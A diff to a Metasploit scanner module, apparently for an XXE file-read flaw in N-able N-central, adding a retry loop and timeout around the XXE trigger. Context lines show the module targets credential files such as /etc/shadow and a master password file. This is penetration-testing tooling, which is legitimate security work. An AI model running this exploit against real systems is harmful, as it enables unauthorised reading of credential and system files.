@@ -8,6 +8,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::Retry
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
@@ -61,6 +62,10 @@ class MetasploitModule < Msf::Auxiliary
         '/var/opt/n-central/tmp/ncbackup/ncbackup.bin, /opt/nable/etc/masterPassword, /etc/shadow)',
         '/etc/passwd'
       ])
+    ])
+
+    register_advanced_options([
+      OptInt.new('XXETriggerTimeout', [false, 'Maximum time to wait for XXE file read to succeed', 10])
     ])
   end
 
@@ -165,19 +170,19 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    sleep(2)
-
     payload_file = build_log_file_path(appliance_id)
-    res = trigger_xxe(session_id, payload_file)
+    file_content = retry_until_truthy(timeout: datastore['XXETriggerTimeout']) do
+      res = trigger_xxe(session_id, payload_file)
+      next nil unless res
 
-    unless res
-      vprint_status("#{rhost}:#{rport} - No response from server")
-      return
+      extract_file_contents(res.body)
+    rescue StandardError => e
+      vprint_error("Error during XXE trigger: #{e.message}")
+      nil
     end
 
-    file_content = extract_file_contents(res.body)
     unless file_content
-      vprint_status("#{rhost}:#{rport} - XXE triggered but could not extract file contents from response")
+      vprint_status("#{rhost}:#{rport} - XXE triggered but could not extract file contents from response (timeout or no content)")
       return
     end
 
